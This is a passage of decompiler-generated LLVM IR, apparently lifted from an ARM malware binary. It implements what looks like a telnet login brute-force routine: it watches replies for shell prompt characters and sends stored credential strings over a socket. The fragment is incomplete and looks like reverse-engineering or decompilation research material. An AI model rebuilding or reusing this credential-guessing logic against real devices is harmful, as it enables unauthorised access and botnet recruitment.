  %v0_fba0 = phi i32 [ %v1_fb24, %dec_label_pc_fb54 ], [ %v1_fb24, %dec_label_pc_fb30 ], [ %v1_fb24, %dec_label_pc_fb4c ], [ %v1_fb24, %dec_label_pc_fb44 ], [ %v1_fb24, %bb440 ], [ %v1_fb84, %dec_label_pc_fb68 ], [ %v1_fb84, %dec_label_pc_fb70 ], [ %v1_fb84, %dec_label_pc_fb78 ], [ %v1_fb84, %bb441 ], [ %v1_fb84, %dec_label_pc_fb8c ]
  %v1_fba0 = add i32 %v0_fba0, 1
  store i32 %v1_fba0, i32* @r7, align 4
  %v1_fba4 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_fbb4 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  %v3_fbb8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fbb8, i32* %r2.global-to-local, align 4
  store i32 %v3_fbb4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fbc4 = load i32, i32* @r6, align 4
  %v1_fbc4 = add i32 %v0_fbc4, 4
  %v2_fbc4 = inttoptr i32 %v1_fbc4 to i32*
  %v3_fbc4 = load i32, i32* %v2_fbc4, align 4
  %v4_fbc8 = call i32 @__libc_send(i32 %v3_fbc4, i32 %v3_fbb4, i32 %v3_fbb8, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fbd8 = load i32, i32* @r6, align 4
  %v1_fbd8 = add i32 %v0_fbd8, 4
  %v2_fbd8 = inttoptr i32 %v1_fbd8 to i32*
  %v3_fbd8 = load i32, i32* %v2_fbd8, align 4
  %v4_fbdc = call i32 @__libc_send(i32 %v3_fbd8, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  %v1_fbe4 = call i32 @table_lock_val(i32 8)
  store i32 7, i32* @r3, align 4
  %v1_fbec = load i32, i32* @r6, align 4
  %v2_fbec = add i32 %v1_fbec, 12
  %v3_fbec = inttoptr i32 %v2_fbec to i32*
  store i32 7, i32* %v3_fbec, align 4
  br label %dec_label_pc_f954

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_f784
  %v1_fbf4 = add i32 %v0_f784, 24
  %v2_fbf4 = inttoptr i32 %v1_fbf4 to i32*
  %v3_fbf4 = load i32, i32* %v2_fbf4, align 4
  store i32 %v3_fbf4, i32* %r2.global-to-local, align 4
  %v1_fbf8 = add i32 %v3_fbf4, -1
  store i32 %v1_fbf8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbfc = icmp eq i32 %v1_fbf8, 0
  store i1 %v2_fbfc, i1* %cpsr_z.global-to-local, align 1
  %tmp442 = icmp slt i32 %v1_fbf8, 1
  br i1 %tmp442, label %dec_label_pc_f704.backedge.thread, label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbf4
  %v2_fc04 = add i32 %v1_fbf8, %v0_f784
  store i32 %v2_fc04, i32* %r3.global-to-local, align 4
  %v1_fc08 = add i32 %v2_fc04, 28
  %v2_fc08 = inttoptr i32 %v1_fc08 to i8*
  %v3_fc08 = load i8, i8* %v2_fc08, align 1
  %v4_fc08 = zext i8 %v3_fc08 to i32
  store i32 %v4_fc08, i32* %r3.global-to-local, align 4
  %v2_fc0c = icmp ugt i8 %v3_fc08, 61
  store i1 %v2_fc0c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc0c = icmp eq i8 %v3_fc08, 62
  store i1 %v7_fc0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc0c, label %dec_label_pc_fc70, label %bb443

bb443:                                            ; preds = %dec_label_pc_fc04
  %v3_fc10 = icmp ugt i8 %v3_fc08, 57
  store i1 %v3_fc10, i1* %cpsr_c.global-to-local, align 1
  %v8_fc10 = icmp eq i8 %v3_fc08, 58
  store i1 %v8_fc10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc10, label %dec_label_pc_fc70, label %dec_label_pc_fc18

dec_label_pc_fc18:                                ; preds = %bb443
  %v2_fc18 = icmp ugt i8 %v3_fc08, 35
  store i1 %v2_fc18, i1* %cpsr_c.global-to-local, align 1
  %v7_fc18 = icmp eq i8 %v3_fc08, 36
  store i1 %v7_fc18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc18, label %dec_label_pc_fc70, label %dec_label_pc_fc20

dec_label_pc_fc20:                                ; preds = %dec_label_pc_fc18
  %v2_fc20 = icmp ugt i8 %v3_fc08, 34
  store i1 %v2_fc20, i1* %cpsr_c.global-to-local, align 1
  %v7_fc20 = icmp eq i8 %v3_fc08, 35
  store i1 %v7_fc20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc20, label %dec_label_pc_fc70, label %dec_label_pc_fc28

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fc20
  %v2_fc28 = icmp ugt i8 %v3_fc08, 36
  store i1 %v2_fc28, i1* %cpsr_c.global-to-local, align 1
  %v7_fc28 = icmp eq i8 %v3_fc08, 37
  store i1 %v7_fc28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc28, label %dec_label_pc_fc70, label %dec_label_pc_fc58.preheader

dec_label_pc_fc58.preheader:                      ; preds = %dec_label_pc_fc28
  %v3_fc2c = add i32 %v0_f784, 28
  %v2_fc30 = add i32 %v3_fc2c, %v3_fbf4
  store i32 %v2_fc30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc58

dec_label_pc_fc3c:                                ; preds = %bb444
  %v2_fc3c = icmp ugt i8 %v3_fc60, 35
  store i1 %v2_fc3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc3c = icmp eq i8 %v3_fc60, 36
  store i1 %v7_fc3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc3c, label %dec_label_pc_fc70, label %dec_label_pc_fc44

dec_label_pc_fc44:                                ; preds = %dec_label_pc_fc3c
  %v2_fc44 = icmp ugt i8 %v3_fc60, 34
  store i1 %v2_fc44, i1* %cpsr_c.global-to-local, align 1
  %v7_fc44 = icmp eq i8 %v3_fc60, 35
  store i1 %v7_fc44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc44, label %dec_label_pc_fc70, label %dec_label_pc_fc4c

dec_label_pc_fc4c:                                ; preds = %dec_label_pc_fc44
  %v2_fc4c = icmp ugt i8 %v3_fc60, 36
  store i1 %v2_fc4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc4c = icmp eq i8 %v3_fc60, 37
  store i1 %v7_fc4c, i1* %cpsr_z.global-to-local, align 1
  %v1_fc50 = add i32 %v0_fc50, -1
  store i32 %v1_fc50, i32* %r3.global-to-local, align 4
  br i1 %v7_fc4c, label %dec_label_pc_fc70, label %dec_label_pc_fc58

dec_label_pc_fc58:                                ; preds = %dec_label_pc_fc58.preheader, %dec_label_pc_fc4c
  %v0_fc50 = phi i32 [ %v2_fc30, %dec_label_pc_fc58.preheader ], [ %v1_fc50, %dec_label_pc_fc4c ]
  %v0_fc58 = phi i32 [ %v1_fbf8, %dec_label_pc_fc58.preheader ], [ %v1_fc58, %dec_label_pc_fc4c ]
  %v1_fc58 = add i32 %v0_fc58, -1
  store i32 %v1_fc58, i32* %r1.global-to-local, align 4
  %v2_fc58 = icmp ne i32 %v0_fc58, 0
  store i1 %v2_fc58, i1* %cpsr_c.global-to-local, align 1
  %v7_fc58 = icmp eq i32 %v0_fc58, 1
  store i1 %v7_fc58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc58, label %dec_label_pc_f704.backedge.thread564, label %dec_label_pc_fc60

dec_label_pc_fc60:                                ; preds = %dec_label_pc_fc58
  %v1_fc60 = add i32 %v0_fc50, -2
  %v2_fc60 = inttoptr i32 %v1_fc60 to i8*
  %v3_fc60 = load i8, i8* %v2_fc60, align 1
  %v4_fc60 = zext i8 %v3_fc60 to i32
  store i32 %v4_fc60, i32* %r2.global-to-local, align 4
  %v2_fc64 = icmp ugt i8 %v3_fc60, 61
  store i1 %v2_fc64, i1* %cpsr_c.global-to-local, align 1
  %v7_fc64 = icmp eq i8 %v3_fc60, 62
  store i1 %v7_fc64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc64, label %dec_label_pc_fc70, label %bb444

bb444:                                            ; preds = %dec_label_pc_fc60
  %v3_fc68 = icmp ugt i8 %v3_fc60, 57
  store i1 %v3_fc68, i1* %cpsr_c.global-to-local, align 1
  %v8_fc68 = icmp eq i8 %v3_fc60, 58
  store i1 %v8_fc68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc68, label %dec_label_pc_fc70, label %dec_label_pc_fc3c

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fc60, %bb444, %dec_label_pc_fc4c, %dec_label_pc_fc44, %dec_label_pc_fc3c, %dec_label_pc_fc28, %dec_label_pc_fc04, %dec_label_pc_fc20, %dec_label_pc_fc18, %bb443
  %v0_fc74 = phi i32 [ %v1_fbf8, %dec_label_pc_fc28 ], [ %v1_fbf8, %dec_label_pc_fc04 ], [ %v1_fbf8, %dec_label_pc_fc20 ], [ %v1_fbf8, %dec_label_pc_fc18 ], [ %v1_fbf8, %bb443 ], [ %v1_fc58, %dec_label_pc_fc3c ], [ %v1_fc58, %dec_label_pc_fc44 ], [ %v1_fc58, %dec_label_pc_fc4c ], [ %v1_fc58, %bb444 ], [ %v1_fc58, %dec_label_pc_fc60 ]
  %v1_fc74 = add i32 %v0_fc74, 1
  store i32 %v1_fc74, i32* @r7, align 4
  %v1_fc78 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_fc88 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  %v3_fc8c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fc8c, i32* %r2.global-to-local, align 4
  store i32 %v3_fc88, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc98 = load i32, i32* @r6, align 4
  %v1_fc98 = add i32 %v0_fc98, 4
  %v2_fc98 = inttoptr i32 %v1_fc98 to i32*
  %v3_fc98 = load i32, i32* %v2_fc98, align 4
  %v4_fc9c = call i32 @__libc_send(i32 %v3_fc98, i32 %v3_fc88, i32 %v3_fc8c, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fcac = load i32, i32* @r6, align 4
  %v1_fcac = add i32 %v0_fcac, 4
  %v2_fcac = inttoptr i32 %v1_fcac to i32*
  %v3_fcac = load i32, i32* %v2_fcac, align 4
  %v4_fcb0 = call i32 @__libc_send(i32 %v3_fcac, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  %v1_fcb8 = call i32 @table_lock_val(i32 7)
  store i32 6, i32* @r3, align 4
  %v1_fcc0 = load i32, i32* @r6, align 4
  %v2_fcc0 = add i32 %v1_fcc0, 12
  %v3_fcc0 = inttoptr i32 %v2_fcc0 to i32*
  store i32 6, i32* %v3_fcc0, align 4
  br label %dec_label_pc_f954

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_f784
  %v1_fcc8 = add i32 %v0_f784, 24
  %v2_fcc8 = inttoptr i32 %v1_fcc8 to i32*
  %v3_fcc8 = load i32, i32* %v2_fcc8, align 4
  store i32 %v3_fcc8, i32* %r2.global-to-local, align 4
  %v1_fccc = add i32 %v3_fcc8, -1
  store i32 %v1_fccc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fcd0 = icmp eq i32 %v1_fccc, 0
  store i1 %v2_fcd0, i1* %cpsr_z.global-to-local, align 1
  %tmp445 = icmp slt i32 %v1_fccc, 1
  br i1 %tmp445, label %dec_label_pc_f704.backedge.thread, label %dec_label_pc_fcd8

dec_label_pc_fcd8:                                ; preds = %dec_label_pc_fcc8
  %v2_fcd8 = add i32 %v1_fccc, %v0_f784
  store i32 %v2_fcd8, i32* %r3.global-to-local, align 4
  %v1_fcdc = add i32 %v2_fcd8, 28
  %v2_fcdc = inttoptr i32 %v1_fcdc to i8*
  %v3_fcdc = load i8, i8* %v2_fcdc, align 1
  %v4_fcdc = zext i8 %v3_fcdc to i32
  store i32 %v4_fcdc, i32* %r3.global-to-local, align 4
  %v2_fce0 = icmp ugt i8 %v3_fcdc, 61
  store i1 %v2_fce0, i1* %cpsr_c.global-to-local, align 1
  %v7_fce0 = icmp eq i8 %v3_fcdc, 62
  store i1 %v7_fce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fce0, label %dec_label_pc_fdb8, label %bb446

bb446:                                            ; preds = %dec_label_pc_fcd8
  %v3_fce4 = icmp ugt i8 %v3_fcdc, 57
  store i1 %v3_fce4, i1* %cpsr_c.global-to-local, align 1
  %v8_fce4 = icmp eq i8 %v3_fcdc, 58
  store i1 %v8_fce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fce4, label %dec_label_pc_fdb8, label %dec_label_pc_fcec

dec_label_pc_fcec:                                ; preds = %bb446
  %v2_fcec = icmp ugt i8 %v3_fcdc, 35
  store i1 %v2_fcec, i1* %cpsr_c.global-to-local, align 1
  %v7_fcec = icmp eq i8 %v3_fcdc, 36
  store i1 %v7_fcec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcec, label %dec_label_pc_fdb8, label %dec_label_pc_fcf4

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fcec
  %v2_fcf4 = icmp ugt i8 %v3_fcdc, 34
  store i1 %v2_fcf4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcf4 = icmp eq i8 %v3_fcdc, 35
  store i1 %v7_fcf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcf4, label %dec_label_pc_fdb8, label %dec_label_pc_fcfc

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fcf4
  %v2_fcfc = icmp ugt i8 %v3_fcdc, 36
  store i1 %v2_fcfc, i1* %cpsr_c.global-to-local, align 1
  %v7_fcfc = icmp eq i8 %v3_fcdc, 37
  store i1 %v7_fcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcfc, label %dec_label_pc_fdb8, label %dec_label_pc_fda0.preheader

dec_label_pc_fda0.preheader:                      ; preds = %dec_label_pc_fcfc
  %v3_fd00 = add i32 %v0_f784, 28
  %v2_fd04 = add i32 %v3_fd00, %v3_fcc8
  store i32 %v2_fd04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fda0

dec_label_pc_fd84:                                ; preds = %bb447
  %v2_fd84 = icmp ugt i8 %v3_fda8, 35
  store i1 %v2_fd84, i1* %cpsr_c.global-to-local, align 1
  %v7_fd84 = icmp eq i8 %v3_fda8, 36
  store i1 %v7_fd84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd84, label %dec_label_pc_fdb8, label %dec_label_pc_fd8c

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd84
  %v2_fd8c = icmp ugt i8 %v3_fda8, 34
  store i1 %v2_fd8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd8c = icmp eq i8 %v3_fda8, 35
  store i1 %v7_fd8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd8c, label %dec_label_pc_fdb8, label %dec_label_pc_fd94

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fd8c
  %v2_fd94 = icmp ugt i8 %v3_fda8, 36
  store i1 %v2_fd94, i1* %cpsr_c.global-to-local, align 1
  %v7_fd94 = icmp eq i8 %v3_fda8, 37
  store i1 %v7_fd94, i1* %cpsr_z.global-to-local, align 1
  %v1_fd98 = add i32 %v0_fd98, -1
  store i32 %v1_fd98, i32* %r3.global-to-local, align 4
  br i1 %v7_fd94, label %dec_label_pc_fdb8, label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fda0.preheader, %dec_label_pc_fd94
  %v0_fd98 = phi i32 [ %v2_fd04, %dec_label_pc_fda0.preheader ], [ %v1_fd98, %dec_label_pc_fd94 ]
  %v0_fda0 = phi i32 [ %v1_fccc, %dec_label_pc_fda0.preheader ], [ %v1_fda0, %dec_label_pc_fd94 ]
  %v1_fda0 = add i32 %v0_fda0, -1
  store i32 %v1_fda0, i32* %r1.global-to-local, align 4
  %v2_fda0 = icmp ne i32 %v0_fda0, 0
  store i1 %v2_fda0, i1* %cpsr_c.global-to-local, align 1
  %v7_fda0 = icmp eq i32 %v0_fda0, 1
  store i1 %v7_fda0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fda0, label %dec_label_pc_f704.backedge.thread564, label %dec_label_pc_fda8

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fda0
  %v1_fda8 = add i32 %v0_fd98, -2
  %v2_fda8 = inttoptr i32 %v1_fda8 to i8*
  %v3_fda8 = load i8, i8* %v2_fda8, align 1
  %v4_fda8 = zext i8 %v3_fda8 to i32
  store i32 %v4_fda8, i32* %r2.global-to-local, align 4
  %v2_fdac = icmp ugt i8 %v3_fda8, 61
  store i1 %v2_fdac, i1* %cpsr_c.global-to-local, align 1
  %v7_fdac = icmp eq i8 %v3_fda8, 62
  store i1 %v7_fdac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdac, label %dec_label_pc_fdb8, label %bb447

bb447:                                            ; preds = %dec_label_pc_fda8
  %v3_fdb0 = icmp ugt i8 %v3_fda8, 57
  store i1 %v3_fdb0, i1* %cpsr_c.global-to-local, align 1
  %v8_fdb0 = icmp eq i8 %v3_fda8, 58
  store i1 %v8_fdb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fdb0, label %dec_label_pc_fdb8, label %dec_label_pc_fd84

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fda8, %bb447, %dec_label_pc_fd94, %dec_label_pc_fd8c, %dec_label_pc_fd84, %dec_label_pc_fcfc, %dec_label_pc_fcd8, %dec_label_pc_fcf4, %dec_label_pc_fcec, %bb446
  %v0_fdbc = phi i32 [ %v1_fccc, %dec_label_pc_fcfc ], [ %v1_fccc, %dec_label_pc_fcd8 ], [ %v1_fccc, %dec_label_pc_fcf4 ], [ %v1_fccc, %dec_label_pc_fcec ], [ %v1_fccc, %bb446 ], [ %v1_fda0, %dec_label_pc_fd84 ], [ %v1_fda0, %dec_label_pc_fd8c ], [ %v1_fda0, %dec_label_pc_fd94 ], [ %v1_fda0, %bb447 ], [ %v1_fda0, %dec_label_pc_fda8 ]
  %v1_fdbc = add i32 %v0_fdbc, 1
  store i32 %v1_fdbc, i32* @r7, align 4
  %v1_fdc0 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_fdd0 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  %v3_fdd4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fdd4, i32* %r2.global-to-local, align 4
  store i32 %v3_fdd0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fde0 = load i32, i32* @r6, align 4
  %v1_fde0 = add i32 %v0_fde0, 4
  %v2_fde0 = inttoptr i32 %v1_fde0 to i32*
  %v3_fde0 = load i32, i32* %v2_fde0, align 4
  %v4_fde4 = call i32 @__libc_send(i32 %v3_fde0, i32 %v3_fdd0, i32 %v3_fdd4, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fdf4 = load i32, i32* @r6, align 4
  %v1_fdf4 = add i32 %v0_fdf4, 4
  %v2_fdf4 = inttoptr i32 %v1_fdf4 to i32*
  %v3_fdf4 = load i32, i32* %v2_fdf4, align 4
  %v4_fdf8 = call i32 @__libc_send(i32 %v3_fdf4, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  %v1_fe00 = call i32 @table_lock_val(i32 9)
  store i32 9, i32* @r3, align 4
  %v1_fe08 = load i32, i32* @r6, align 4
  %v2_fe08 = add i32 %v1_fe08, 12
  %v3_fe08 = inttoptr i32 %v2_fe08 to i32*
  store i32 9, i32* %v3_fe08, align 4
  br label %dec_label_pc_f954

dec_label_pc_fe10:                                ; preds = %dec_label_pc_f784
  %v1_fe10 = add i32 %v0_f784, 24
  %v2_fe10 = inttoptr i32 %v1_fe10 to i32*
  %v3_fe10 = load i32, i32* %v2_fe10, align 4
  store i32 %v3_fe10, i32* %r2.global-to-local, align 4
  %v1_fe14 = add i32 %v3_fe10, -1
  store i32 %v1_fe14, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe18 = icmp eq i32 %v1_fe14, 0
  store i1 %v2_fe18, i1* %cpsr_z.global-to-local, align 1
  %tmp448 = icmp slt i32 %v1_fe14, 1
  br i1 %tmp448, label %dec_label_pc_fe7c, label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe10
  %v2_fe20 = add i32 %v1_fe14, %v0_f784
  store i32 %v2_fe20, i32* %r3.global-to-local, align 4
  %v1_fe24 = add i32 %v2_fe20, 28
  %v2_fe24 = inttoptr i32 %v1_fe24 to i8*
  %v3_fe24 = load i8, i8* %v2_fe24, align 1
  %v4_fe24 = zext i8 %v3_fe24 to i32
  store i32 %v4_fe24, i32* %r3.global-to-local, align 4
  %v2_fe28 = icmp ugt i8 %v3_fe24, 61
  store i1 %v2_fe28, i1* %cpsr_c.global-to-local, align 1
  %v7_fe28 = icmp eq i8 %v3_fe24, 62
  store i1 %v7_fe28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe28, label %dec_label_pc_101b0, label %bb449

bb449:                                            ; preds = %dec_label_pc_fe20
  %v3_fe2c = icmp ugt i8 %v3_fe24, 57
  store i1 %v3_fe2c, i1* %cpsr_c.global-to-local, align 1
  %v8_fe2c = icmp eq i8 %v3_fe24, 58
  store i1 %v8_fe2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe2c, label %dec_label_pc_101b0, label %dec_label_pc_fe34

dec_label_pc_fe34:                                ; preds = %bb449
  %v2_fe34 = icmp ugt i8 %v3_fe24, 35
  store i1 %v2_fe34, i1* %cpsr_c.global-to-local, align 1
  %v7_fe34 = icmp eq i8 %v3_fe24, 36
  store i1 %v7_fe34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe34, label %dec_label_pc_101b0, label %dec_label_pc_fe3c

dec_label_pc_fe3c:                                ; preds = %dec_label_pc_fe34
  %v2_fe3c = icmp ugt i8 %v3_fe24, 34
  store i1 %v2_fe3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe3c = icmp eq i8 %v3_fe24, 35
  store i1 %v7_fe3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe3c, label %dec_label_pc_101b0, label %dec_label_pc_fe74.preheader

dec_label_pc_fe74.preheader:                      ; preds = %dec_label_pc_fe3c
  %v3_fe40 = add i32 %v0_f784, 28
  %v2_fe44 = add i32 %v3_fe40, %v3_fe10
  store i32 %v2_fe44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe74

dec_label_pc_fe50:                                ; preds = %dec_label_pc_fe74
  %v1_fe50 = add i32 %v0_fe6c, -2
  %v2_fe50 = inttoptr i32 %v1_fe50 to i8*
  %v3_fe50 = load i8, i8* %v2_fe50, align 1
  %v4_fe50 = zext i8 %v3_fe50 to i32
  store i32 %v4_fe50, i32* %r2.global-to-local, align 4
  %v2_fe54 = icmp ugt i8 %v3_fe50, 61
  store i1 %v2_fe54, i1* %cpsr_c.global-to-local, align 1
  %v7_fe54 = icmp eq i8 %v3_fe50, 62
  store i1 %v7_fe54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe54, label %dec_label_pc_101b0, label %bb450

bb450:                                            ; preds = %dec_label_pc_fe50
  %v3_fe58 = icmp ugt i8 %v3_fe50, 57
  store i1 %v3_fe58, i1* %cpsr_c.global-to-local, align 1
  %v8_fe58 = icmp eq i8 %v3_fe50, 58
  store i1 %v8_fe58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe58, label %dec_label_pc_101b0, label %dec_label_pc_fe60

dec_label_pc_fe60:                                ; preds = %bb450
  %v2_fe60 = icmp ugt i8 %v3_fe50, 35
  store i1 %v2_fe60, i1* %cpsr_c.global-to-local, align 1
  %v7_fe60 = icmp eq i8 %v3_fe50, 36
  store i1 %v7_fe60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe60, label %dec_label_pc_101b0, label %dec_label_pc_fe68

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe60
  %v2_fe68 = icmp ugt i8 %v3_fe50, 34
  store i1 %v2_fe68, i1* %cpsr_c.global-to-local, align 1
  %v7_fe68 = icmp eq i8 %v3_fe50, 35
  store i1 %v7_fe68, i1* %cpsr_z.global-to-local, align 1
  %v1_fe6c = add i32 %v0_fe6c, -1
  store i32 %v1_fe6c, i32* %r3.global-to-local, align 4
  br i1 %v7_fe68, label %dec_label_pc_101b0, label %dec_label_pc_fe74

dec_label_pc_fe74:                                ; preds = %dec_label_pc_fe74.preheader, %dec_label_pc_fe68
  %v0_fe6c = phi i32 [ %v2_fe44, %dec_label_pc_fe74.preheader ], [ %v1_fe6c, %dec_label_pc_fe68 ]
  %v0_fe74 = phi i32 [ %v1_fe14, %dec_label_pc_fe74.preheader ], [ %v1_fe74, %dec_label_pc_fe68 ]
  %v1_fe74 = add i32 %v0_fe74, -1
  store i32 %v1_fe74, i32* %r1.global-to-local, align 4
  %v2_fe74 = icmp ne i32 %v0_fe74, 0
  store i1 %v2_fe74, i1* %cpsr_c.global-to-local, align 1
  %v7_fe74 = icmp eq i32 %v0_fe74, 1
  store i1 %v7_fe74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe74, label %dec_label_pc_fe7c, label %dec_label_pc_fe50

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fe74, %dec_label_pc_fe10
  %v1_fe80 = call i32 @table_unlock_val(i32 30)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  %v3_fe90 = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  %v3_fe94 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fe90, i32* %r2.global-to-local, align 4
  %v1_fe9c = add i32 %v3_fe94, -1
  store i32 %v1_fe9c, i32* %r3.global-to-local, align 4
  %v0_fea0 = load i32, i32* @fp, align 4
  %v0_fea4 = load i32, i32* @r6, align 4
  %v1_fea4 = add i32 %v0_fea4, 24
  %v2_fea4 = inttoptr i32 %v1_fea4 to i32*
  %v3_fea4 = load i32, i32* %v2_fea4, align 4
  store i32 %v3_fea4, i32* %r1.global-to-local, align 4
  %v4_fea8 = call i32 @util_memsearch(i32 %v0_fea0, i32 %v3_fea4, i32 %v3_fe90, i32 %v1_fe9c)
  %v1_feac = add i32 %v4_fea8, 1
  store i32 %v1_feac, i32* @r7, align 4
  %v2_feac = icmp eq i32 %v4_fea8, -1
  store i1 %v2_feac, i1* %cpsr_c.global-to-local, align 1
  %v7_feac = icmp eq i32 %v1_feac, 0
  store i1 %v7_feac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_feac, label %dec_label_pc_10464.loopexit, label %dec_label_pc_febc

dec_label_pc_febc:                                ; preds = %dec_label_pc_fe7c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_fec0 = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fec4

dec_label_pc_fec4:                                ; preds = %dec_label_pc_101b0, %dec_label_pc_febc
  %v0_fec4 = load i32, i32* @r6, align 4
  %v1_fec4 = inttoptr i32 %v0_fec4 to i32*
  %v2_fec4 = load i32, i32* %v1_fec4, align 4
  store i32 %v2_fec4, i32* %r3.global-to-local, align 4
  %v1_fec8 = add i32 %v0_fec4, 4
  %v2_fec8 = inttoptr i32 %v1_fec8 to i32*
  %v3_fec8 = load i32, i32* %v2_fec8, align 4
  %v1_fecc = add i32 %v2_fec4, 13
  %v2_fecc = inttoptr i32 %v1_fecc to i8*
  %v3_fecc = load i8, i8* %v2_fecc, align 1
  %v4_fecc = zext i8 %v3_fecc to i32
  store i32 %v4_fecc, i32* %r2.global-to-local, align 4
  %v1_fed0 = add i32 %v2_fec4, 4
  %v2_fed0 = inttoptr i32 %v1_fed0 to i32*
  %v3_fed0 = load i32, i32* %v2_fed0, align 4
  store i32 %v3_fed0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fed8 = call i32 @__libc_send(i32 %v3_fec8, i32 %v3_fed0, i32 %v4_fecc, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fee0 = load i32, i32* @r6, align 4
  %v1_fee0 = add i32 %v0_fee0, 4
  %v2_fee0 = inttoptr i32 %v1_fee0 to i32*
  %v3_fee0 = load i32, i32* %v2_fee0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_feec = call i32 @__libc_send(i32 %v3_fee0, i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), i32 2, i32 16384)
  store i32 5, i32* @r3, align 4
